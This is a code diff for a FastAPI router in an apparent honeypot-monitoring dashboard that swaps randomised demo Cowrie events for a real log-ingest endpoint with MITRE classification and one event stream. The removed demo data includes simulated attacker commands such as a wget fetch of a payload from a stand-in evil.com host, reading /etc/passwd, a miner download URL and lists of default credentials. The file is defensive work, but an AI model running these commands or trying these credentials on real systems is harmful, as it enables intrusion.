@@ -1,161 +1,104 @@
 import logging
-import random
 import json
 import asyncio
 from datetime import datetime, timezone
-from typing import AsyncGenerator
-from fastapi import APIRouter, Request
+from typing import AsyncGenerator, Union
+from fastapi import APIRouter, Request, Body
 from fastapi.responses import StreamingResponse
+from backend.api.bus import dashboard_bus
+
+from backend.agents.mitre_classifier.main import classify_logs, correlate_logs
 
 logger = logging.getLogger(__name__)
 router = APIRouter(prefix="/dashboard", tags=["dashboard"])
 
-# ── demo data pools ────────────────────────────────────────────────────────────
-
-_SAMPLE_IPS = [
-    "185.220.101.47", "45.33.32.156", "192.168.1.100",
-    "10.10.10.5", "198.51.100.22", "203.0.113.99",
-]
-
-_SAMPLE_USERS = ["root", "admin", "ubuntu", "pi", "oracle", "test", "guest"]
-_SAMPLE_PASSWORDS = ["123456", "password", "admin", "letmein", "qwerty", "toor", "raspberry"]
-
-_COWRIE_EVENTS = [
-    {"eventid": "cowrie.session.connect",   "message": "New connection"},
-    {"eventid": "cowrie.login.failed",      "message": "Login attempt failed"},
-    {"eventid": "cowrie.login.success",     "message": "Login succeeded"},
-    {"eventid": "cowrie.command.input",     "message": "Command input", "input": "whoami"},
-    {"eventid": "cowrie.command.input",     "message": "Command input", "input": "wget http://evil.com/payload.sh -O /tmp/p.sh"},
-    {"eventid": "cowrie.command.input",     "message": "Command input", "input": "cat /etc/passwd"},
-    {"eventid": "cowrie.command.input",     "message": "Command input", "input": "uname -a"},
-    {"eventid": "cowrie.session.file_download", "message": "File downloaded", "url": "http://185.220.101.47/miner"},
-    {"eventid": "cowrie.session.closed",    "message": "Connection closed"},
-    {"eventid": "cowrie.direct-tcpip.request", "message": "TCP tunnel request"},
-]
-
-_ATTACK_CHAINS = [
-    {
-        "chain_id": "CHN-001",
-        "attacker_ip": "185.220.101.47",
-        "steps": [
-            {"step": 1, "event": "cowrie.session.connect",   "desc": "Initial connection"},
-            {"step": 2, "event": "cowrie.login.failed",      "desc": "Brute-force attempt (×12)"},
-            {"step": 3, "event": "cowrie.login.success",     "desc": "Credential match: root/toor"},
-            {"step": 4, "event": "cowrie.command.input",     "desc": "Ran: wget http://evil.com/miner"},
-            {"step": 5, "event": "cowrie.session.file_download", "desc": "Downloaded malware payload"},
-        ],
-        "technique": "T1110 – Brute Force → T1105 – Ingress Tool Transfer",
-        "severity": "critical",
-    },
-    {
-        "chain_id": "CHN-002",
-        "attacker_ip": "45.33.32.156",
-        "steps": [
-            {"step": 1, "event": "cowrie.session.connect",   "desc": "Initial connection"},
-            {"step": 2, "event": "cowrie.login.success",     "desc": "Default cred: admin/admin"},
-            {"step": 3, "event": "cowrie.command.input",     "desc": "Ran: cat /etc/passwd"},
-            {"step": 4, "event": "cowrie.command.input",     "desc": "Ran: id && uname -a"},
-        ],
-        "technique": "T1078 – Valid Accounts → T1087 – Account Discovery",
-        "severity": "high",
-    },
-    {
-        "chain_id": "CHN-003",
-        "attacker_ip": "198.51.100.22",
-        "steps": [
-            {"step": 1, "event": "cowrie.session.connect",   "desc": "Port scan detected"},
-            {"step": 2, "event": "cowrie.login.failed",      "desc": "SSH brute-force (×34)"},
-        ],
-        "technique": "T1046 – Network Service Discovery → T1110 – Brute Force",
-        "severity": "medium",
-    },
-]
-
-# ── helpers ────────────────────────────────────────────────────────────────────
-
 def _now() -> str:
     return datetime.now(tz=timezone.utc).strftime("%H:%M:%S")
 
-def _make_event(base: dict) -> dict:
-    e = {**base}
-    e["src_ip"]    = random.choice(_SAMPLE_IPS)
-    e["username"]  = random.choice(_SAMPLE_USERS)
-    e["password"]  = random.choice(_SAMPLE_PASSWORDS)
-    e["session"]   = f"sess-{random.randint(10000,99999)}"
-    e["timestamp"] = _now()
-    return e
+# ── Endpoint: Push Data ────────────────────────────────────────────────────────
 
-def _sse(payload: dict) -> str:
-    return f"data: {json.dumps(payload)}\n\n"
+@router.post("/send_honeypot_json")
+async def send_honeypot_json(data: Union[dict, list] = Body(...)):
+    """
+    Receives JSON or List of JSON and pushes items to all dashboard clients.
+    Also triggers MITRE classification in the background.
+    """
+    subs = len(dashboard_bus.subscribers)
+    
+    if not isinstance(data, list):
+        data = [data]
 
-async def _guard(request: Request) -> bool:
-    return await request.is_disconnected()
+    # 1. Immediate Broadcast of raw logs
+    count = 0
+    for item in data:
+        if isinstance(item, dict) and "timestamp" not in item:
+            item["timestamp"] = _now()
+        await dashboard_bus.emit(item)
+        count += 1
 
-# ── endpoint 1: live logs ──────────────────────────────────────────────────────
+    # 2. Background Classification
+    async def run_and_emit_classification(log_data):
+        logger.info(f"Background classification task started for {len(log_data)} logs.")
+        try:
+            # results is now a List[dict]
+            results = await classify_logs(log_data)
+            if results:
+                for res in results:
+                    res["timestamp"] = _now()
+                    await dashboard_bus.emit(res)
+                logger.info(f"Emitted {len(results)} individual classifications.")
+            else:
+                logger.warning("Classification results was empty or None.")
 
-@router.get("/live-logs")
-async def stream_live_logs(request: Request):
-    async def gen() -> AsyncGenerator[str, None]:
-        while not await _guard(request):
-            event = _make_event(random.choice(_COWRIE_EVENTS))
-            yield _sse({"type": "live_log", **event})
-            await asyncio.sleep(random.uniform(0.8, 2.5))
-    return StreamingResponse(gen(), media_type="text/event-stream")
+            # 2. Correlation (Multi-stage Analysis)
+            correlation = await correlate_logs(log_data)
+            if correlation:
+                if "timestamp" not in correlation:
+                    correlation["timestamp"] = _now()
+                if "detected_at" not in correlation:
+                    correlation["detected_at"] = _now()
+                await dashboard_bus.emit(correlation)
+                logger.info("Attack correlation emitted to dashboard bus.")
 
-# ── endpoint 2: risk scores ────────────────────────────────────────────────────
+        except Exception as e:
+            logger.error(f"Classification background task failed: {e}", exc_info=True)
 
-_RISK_MAP: dict[str, int] = {
-    "cowrie.session.connect":        10,
-    "cowrie.login.failed":           40,
-    "cowrie.login.success":          75,
-    "cowrie.command.input":          60,
-    "cowrie.session.file_download":  95,
-    "cowrie.direct-tcpip.request":   80,
-    "cowrie.session.closed":          5,
-}
+    # Fire and forget
+    asyncio.create_task(run_and_emit_classification(data))
 
-_RISK_LABEL = {
-    range(0,  30):  ("Low",      "#22c55e"),
-    range(30, 60):  ("Medium",   "#f59e0b"),
-    range(60, 80):  ("High",     "#f97316"),
-    range(80, 101): ("Critical", "#ef4444"),
-}
+    return {"status": "broadcasted", "items": count, "subscribers": subs}
 
-def _risk_label(score: int) -> tuple[str, str]:
-    for r, (label, colour) in _RISK_LABEL.items():
-        if score in r:
-            return label, colour
-    return "Unknown", "#6b7280"
+# ── Endpoint: Consolidated Stream ──────────────────────────────────────────────
 
-@router.get("/risk-scores")
-async def stream_risk_scores(request: Request):
-    async def gen() -> AsyncGenerator[str, None]:
-        while not await _guard(request):
-            event = _make_event(random.choice(_COWRIE_EVENTS))
-            base_score = _RISK_MAP.get(event["eventid"], 30)
-            jitter     = random.randint(-8, 8)
-            score      = max(0, min(100, base_score + jitter))
-            label, colour = _risk_label(score)
-            yield _sse({
-                "type":      "risk_score",
-                "eventid":   event["eventid"],
-                "src_ip":    event["src_ip"],
-                "score":     score,
-                "severity":  label,
-                "colour":    colour,
-                "timestamp": _now(),
-                "session":   event["session"],
-            })
-            await asyncio.sleep(random.uniform(1.0, 3.0))
-    return StreamingResponse(gen(), media_type="text/event-stream")
+@router.get("/stream")
+async def stream_dashboard_events(request: Request):
+    """
+    A single SSE stream that pushes all dashboard-related notifications.
+    """
+    queue = await dashboard_bus.subscribe()
+    client_ip = request.client.host if request.client else "unknown"
+    logger.info(f"New dashboard subscriber connected from {client_ip}. Total: {len(dashboard_bus.subscribers)}")
 
-# ── endpoint 3: multi-step attack chains ───────────────────────────────────────
+    async def event_generator():
+        try:
+            while True:
+                if await request.is_disconnected():
+                    logger.info(f"Dashboard client {client_ip} disconnected.")
+                    break
+                
+                try:
+                    # Use a timeout so we can check for disconnection periodically
+                    msg = await asyncio.wait_for(queue.get(), timeout=1.0)
+                    yield msg
+                except asyncio.TimeoutError:
+                    continue
+        except Exception as e:
+            logger.error(f"Error in dashboard stream for {client_ip}: {e}")
+        finally:
+            dashboard_bus.unsubscribe(queue)
+            logger.info(f"Unsubscribed client {client_ip}. Remaining: {len(dashboard_bus.subscribers)}")
 
-@router.get("/attack-chains")
-async def stream_attack_chains(request: Request):
-    async def gen() -> AsyncGenerator[str, None]:
-        while not await _guard(request):
-            chain = random.choice(_ATTACK_CHAINS)
-            yield _sse({"type": "attack_chain", **chain, "detected_at": _now()})
-            await asyncio.sleep(random.uniform(6.0, 12.0))
-    return StreamingResponse(gen(), media_type="text/event-stream")
+    return StreamingResponse(event_generator(), media_type="text/event-stream")
+
+# We'll need to start this simulator somewhere, or keep it in dashboard.py 
+# for convenience. main.py is better for lifecycle management.
